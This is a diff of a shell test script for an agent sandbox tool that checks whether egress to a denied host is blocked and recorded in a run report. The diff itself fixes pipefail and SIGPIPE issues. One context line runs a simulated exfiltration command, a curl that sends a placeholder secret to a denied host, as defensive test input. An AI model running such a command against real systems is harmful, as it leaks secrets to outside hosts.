@@ -104,12 +104,17 @@ printf '   (the CLI injects HTTPS_PROXY → the sidecar; policy denies %s)\n' "$
 as run --lockdown shtest -- -c \
   "curl -s -m 6 https://$DENIED/steal?secret=TOPSECRET; true" > "$cap" 2>&1 || true
 cat "$cap"
-run_id="$(strip_ansi < "$cap" | grep -oE 'r-[0-9a-f]+' | head -1)"
+# `awk NR==1` rather than `head -1`: head exits early, SIGPIPEs grep, and
+# `set -o pipefail` propagates the 141.
+run_id="$(strip_ansi < "$cap" | grep -oE 'r-[0-9a-f]+' | awk 'NR==1')"
 
 line "3. The flight recorder — agentstack report run $run_id"
 as report run "$run_id" > "$cap" 2>&1 || true
 cat "$cap"
-if strip_ansi < "$cap" | grep -qE "✗ .*$DENIED"; then
+# Capture once, then match: `strip_ansi | grep -q` fails under pipefail once
+# the report is long enough that grep's early exit SIGPIPEs the writer.
+REPORT="$(strip_ansi < "$cap")"
+if grep -qE "✗ .*$DENIED" <<< "$REPORT"; then
   ok "the block to $DENIED is recorded, naming the machine policy that denied it"
 else
   bad "expected a recorded egress block to $DENIED in the report"
